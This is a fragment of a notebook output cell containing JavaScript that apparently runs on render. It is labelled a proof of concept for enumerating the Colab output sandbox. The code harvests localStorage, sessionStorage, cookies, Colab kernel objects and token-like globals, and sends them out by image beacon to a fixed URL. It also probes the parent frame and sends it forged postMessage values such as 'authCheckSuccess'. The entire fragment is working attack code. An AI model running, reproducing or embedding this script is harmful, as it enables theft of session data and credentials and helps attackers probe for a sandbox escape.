      "application/javascript": [
       "(function(){\n",
       "  var B='https://colab.research.google.com/__poc_enum__';\n",
       "  function send(tag,val){try{new Image().src=B+'?tag='+encodeURIComponent(tag)+'&v='+encodeURIComponent(String(val).slice(0,700))+'&t='+Date.now();}catch(e){}}\n",
       "  function safe(tag,fn){try{send(tag,fn());}catch(e){send(tag+'_ERR',String(e));}}\n",
       "  send('origin', location.href);\n",
       "  // 1) storage on this googleusercontent origin\n",
       "  safe('localStorage', function(){var o={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);o[k]=String(localStorage.getItem(k)).slice(0,80);}return JSON.stringify(o);});\n",
       "  safe('sessionStorage', function(){var o={};for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);o[k]=String(sessionStorage.getItem(k)).slice(0,80);}return JSON.stringify(o);});\n",
       "  safe('cookie', function(){return document.cookie;});\n",
       "  // 2) google.colab structure\n",
       "  safe('has_google', function(){return typeof google+'/'+(typeof google!=='undefined'&&!!google.colab);});\n",
       "  safe('gc_keys', function(){return Object.keys(google.colab).join(',');});\n",
       "  safe('gc_kernel_keys', function(){return Object.keys(google.colab.kernel).join(',')+' aa='+google.colab.kernel.accessAllowed;});\n",
       "  // 3) interesting globals possibly holding tokens/ports/endpoints\n",
       "  safe('global_tokenish', function(){var hits=[];for(var k in window){try{if(/token|secret|proxy|kernel|endpoint|nonce|port|auth|creden/i.test(k))hits.push(k+'='+String(window[k]).slice(0,40));}catch(e){}}return hits.join(' | ');});\n",
       "  // 4) window relationships\n",
       "  safe('rel', function(){return 'parent='+(window.parent!==window)+' top='+(window.top!==window)+' opener='+(!!window.opener)+' frames='+window.frames.length;});\n",
       "  // 5) can we read anything off parent? (expect cross-origin throw)\n",
       "  safe('parent_href', function(){return window.parent.location.href;});\n",
       "  // 6) does parent respond to any postMessage? attach listener then poke\n",
       "  try{window.addEventListener('message', function(m){send('parent_reply','origin='+m.origin+' data='+String(JSON.stringify(m.data)).slice(0,200));});}catch(e){}\n",
       "  function poke(d){try{window.parent.postMessage(d,'*');}catch(e){}}\n",
       "  setTimeout(function(){ poke('authCheckSuccess'); poke({sandboxed_iframe_evaluation:'1'}); poke({type:'ping'}); poke({action:'ping'}); send('poked','done'); }, 1500);\n",
       "})();"
